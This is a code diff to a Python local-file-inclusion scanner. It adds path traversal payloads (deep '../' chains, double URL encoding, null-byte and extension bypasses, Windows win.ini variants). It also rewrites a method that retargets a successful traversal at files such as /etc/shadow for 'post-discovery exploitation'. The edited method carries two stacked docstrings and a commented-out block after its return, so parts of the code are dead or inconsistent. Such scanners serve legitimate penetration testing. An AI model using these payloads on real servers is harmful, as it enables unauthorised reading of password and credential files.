@@ -22,7 +22,7 @@ class LFIScanner:
         - payloads: List of path traversal test patterns
         - vulnerabilities: Store found vulnerabilities
         - exploit_files: Target files for post-discovery exploitation"""
-        self.session = self._create_session(proxy)
+        self.session = self._create_session(proxy)  
         self.tested_combinations = set()
         self.visited_urls = set()
         self.payloads = self._generate_payloads()
@@ -67,13 +67,27 @@ class LFIScanner:
         base_paths = [
             # Basic directory traversal patterns
             '/etc/passwd', '../etc/passwd', '../../etc/passwd',
+            '../../../../../../../../etc/passwd',
+            '....//....//....//etc/passwd',
+            '....\/....\/....\/etc/passwd',
             # Encoded payload variations
-            '%2e%2e%2f' * 8 + 'etc/passwd',
+            '%2e%2e%2f' * 6 + 'etc/passwd',
+            '%252e%252e%252f' * 6 + 'etc/passwd',
             # Windows path variations
             '..\\..\\..\\..\\windows\\win.ini'.replace('\\', quote('\\')),
+            '..%255c..%255c..%255cwindows%255cwin.ini',
             # File extension bypass
             '../../../etc/passwd%00.png',
+            '../../../etc/passwd%00.jpg',
+            # Null byte termination
+            '../../../../etc/passwd%00',
+            '../../../../etc/passwd%2500',
+            # Start path validation bypass
+            '/var/www/images/../../../etc/passwd',
+
         ]
+
+
         # Generate encoded versions of all base payloads
         encoded_paths = [quote(payload, safe='') for payload in base_paths]
         # Add unicode-based bypass attempts
@@ -149,22 +163,70 @@ class LFIScanner:
         return None
 
     def _generate_exploit_payload(self, base_payload, target_file):
-        """Adapt successful payload for new targets
-        - Preserves original traversal pattern
-        - Replaces target filename/path
-        - Maintains encoding style from original payload"""
+        """Generate exploitation payload while preserving encoding layers
+
+        1. Calculate original payload's encoding depth
+        2. Fully decode to raw traversal sequence
+        3. Replace target file in decoded path
+        4. Re-apply equivalent encoding layers
+
+        Example:
+        Original: %252e%252e%252fetc/passwd (double-encoded)
+        -> Decoded: ../../etc/passwd
+        -> Modified: ../../etc/shadow
+        -> Re-encoded: %252e%252e%252fetc%252fshadow
+        """
+
+
+        """Generate exploitation payload by direct replacement of vulnerable path
+    
+        Process:
+        1. URL-decode the original payload to handle any encoding
+        2. Replace 'etc/passwd' with target file in decoded payload
+        3. Re-encode while preserving null bytes and original structure
+
+        Example:
+        Original payload: ../../../etc/passwd%00.png
+        -> Decoded: ../../../etc/passwd\x00.png
+        -> Replaced: ../../../etc/shadow\x00.png
+        -> Encoded: ../../../etc/shadow%00.png
+        """
+        # Decode payload to handle URL encoding
         decoded_payload = unquote(base_payload)
-        # Extract base traversal pattern
-        if '/etc/passwd' in decoded_payload:
-            base_pattern = decoded_payload.split('/etc/passwd')[0]
-        else:
-            # Fallback pattern extraction
-            match = re.search(r'(.*?)(?:[\/\\]?[\w\.\-]+)$', decoded_payload)
-            base_pattern = match.group(1) if match else decoded_payload
-        # Clean null bytes and reconstruct payload
-        base_pattern = base_pattern.replace('%00', '').replace('\x00', '')
-        encoded_pattern = base_payload.replace(decoded_payload, base_pattern)
-        return encoded_pattern + quote(target_file)
+
+        # Prepare target path (remove leading slash to prevent path issues)
+        stripped_target = target_file.lstrip('/')
+
+        # Perform direct replacement in decoded payload
+        modified_payload = decoded_payload.replace('etc/passwd', stripped_target)
+
+        # Re-encode while preserving all components (including null bytes)
+        return quote(modified_payload)
+
+
+        # # Detect encoding depth by successive decoding
+        # encoding_depth = 0
+        # current_payload = base_payload
+        # while True:
+        #     decoded = unquote(current_payload)
+        #     if decoded == current_payload:  # No more encoding layers
+        #         break
+        #     encoding_depth += 1
+        #     current_payload = decoded
+
+        # # Replace target file in fully decoded payload
+        # stripped_target = target_file.lstrip('/')
+        # modified = current_payload.replace('etc/passwd', stripped_target)
+
+        # # Remove null bytes from original pattern
+        # modified = modified.replace('\x00', '').replace('%00', '')
+
+        # # Re-apply equivalent encoding layers
+        # encoded_payload = modified
+        # for _ in range(encoding_depth):
+        #     encoded_payload = quote(encoded_payload)
+
+        # return encoded_payload
 
     def _extract_target_file(self, base_payload):
         """Identify reusable traversal pattern
